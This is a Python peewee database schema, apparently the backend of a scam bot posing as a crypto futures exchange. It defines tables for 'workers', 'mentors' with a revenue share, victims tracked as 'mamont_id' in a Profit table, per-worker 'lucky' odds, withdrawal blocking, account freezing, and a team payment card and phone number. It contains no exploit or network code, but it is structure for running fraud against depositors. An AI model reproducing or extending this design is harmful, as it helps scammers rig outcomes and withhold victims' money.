from peewee import *

database = SqliteDatabase('database.db')

class BaseModel(Model):
	id = PrimaryKeyField()

	class Meta:
		database = database
		

class User(BaseModel):
	user_id = IntegerField()
	balance = IntegerField(default=0)
	currency = IntegerField(default=4)
	requisites = CharField(null=True)
	verif = BooleanField(default=False)
	freeze = BooleanField(default=False)
	support_mark = BooleanField(default=False)
	cabinet_file_id = CharField(null=True)
    
class CryptoCurrency(BaseModel):
	name = CharField()		
	exchange_rate = FloatField()

class Currency(BaseModel):
	name = CharField()
	exchange_rate = FloatField()
	ico = CharField()

class CryptoBalance(BaseModel):
	currency = IntegerField()
	amount = IntegerField(default=0)

class Fututes(BaseModel):
	user_id = IntegerField()
	coin = IntegerField()
	amount = IntegerField(null=True)
	time = IntegerField(null=True)
	credit = CharField(null=True)
	start_time = IntegerField(null=True)
	start_price = IntegerField(null=True)
	finish_price = IntegerField(null=True)
	is_active = BooleanField(default=False)
	message_id = IntegerField(null=True)
	type = CharField(null=True)

class Family(BaseModel):
	user_id = IntegerField()
	baby_id = IntegerField()

class Depo(BaseModel):
	user_id = IntegerField()
	time = IntegerField()
	price = IntegerField()
	type = CharField()
	is_canceled = BooleanField(default=False)
	is_payment = BooleanField(default=False)

class WorkerConfig(BaseModel):
	worker_id = IntegerField()
	min_deposite = IntegerField(default=200)
	lucky = IntegerField(default=2)
	logging = BooleanField(default=True)
	input = BooleanField(default=False)
	output_block = BooleanField(default=False)
	withdraw = IntegerField(default=3)

class SelfConfig(BaseModel):
	user_id = IntegerField()
	min_deposite = IntegerField(default=200)
	lucky = IntegerField(default=2)
	withdraw = IntegerField(default=3)

class Profit(BaseModel):
	worker_id = IntegerField()
	mamont_id = IntegerField(null=True)
	price = IntegerField()
	time = IntegerField()

class Worker(BaseModel):
	user_id = IntegerField()
	tag = CharField()
	useTag = BooleanField(default=True)
	mentor_id = IntegerField(null=True)
	created_time = IntegerField()

class Mentor(BaseModel):
	user_id = IntegerField()
	name = CharField()
	part = IntegerField(default=10)

class ReportedCard(BaseModel):
	value = CharField()

class TeamConfig(BaseModel):
	card = CharField(default='1234123412341234')
	number = CharField(default='+7(952)8125252')

def main():
	# database.drop_tables([Worker])
	# database.create_tables([TeamConfig])C
	t = TeamConfig.create()
	t.save()


if __name__ == "__main__":
    main()
	